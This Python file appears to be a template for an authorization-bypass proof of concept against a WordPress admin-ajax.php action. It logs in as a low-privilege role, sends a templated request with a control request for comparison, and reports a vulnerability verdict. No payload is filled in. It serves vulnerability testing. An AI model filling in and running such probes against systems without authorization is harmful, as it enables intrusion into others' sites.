import requests
from wp_login import wp_login
from poc_result import emit_result

TARGET   = "{{ target_url }}"
ACTION   = "{{ ajax_action }}"
USERNAME = "{{ test_username }}"
PASSWORD = "{{ test_password }}"
ATTACKER_ROLE = "{{ attacker_role }}"

session = requests.Session()
if ATTACKER_ROLE.lower() not in {"unauthenticated", "anonymous", "guest"}:
    login = wp_login(session, TARGET, USERNAME, PASSWORD)
    if not login.success:
        raise RuntimeError(f"attacker login failed: {login.reason}")

resp = session.post(f"{TARGET}/wp-admin/admin-ajax.php", data={
    "action": ACTION,
    {{ extra_params }}
})

# A 200 response is not proof. Replace this template predicate with a concrete
# privileged state/read marker from the affected handler.
privileged_marker = ""
attack_allowed = bool(privileged_marker and privileged_marker in resp.text)
control = session.post(
    f"{TARGET}/wp-admin/admin-ajax.php",
    data={"action": "squadrone_nonexistent_control"},
    timeout=20,
)
control_allowed = bool(privileged_marker and privileged_marker in control.text)
emit_result(
    verdict="vulnerable" if attack_allowed and not control_allowed else "not_vulnerable",
    oracle="authorization",
    attacker_role=ATTACKER_ROLE,
    request={"method": "POST", "url": f"{TARGET}/wp-admin/admin-ajax.php"},
    attack={"observed": attack_allowed and not control_allowed, "allowed": attack_allowed, "privileged_effect": privileged_marker},
    control={"observed": control_allowed, "allowed": control_allowed},
    integrity="high" if attack_allowed and not control_allowed else "none",
    impact="A low-privilege account performed the measured privileged effect." if attack_allowed and not control_allowed else "No privileged effect was measured.",
)
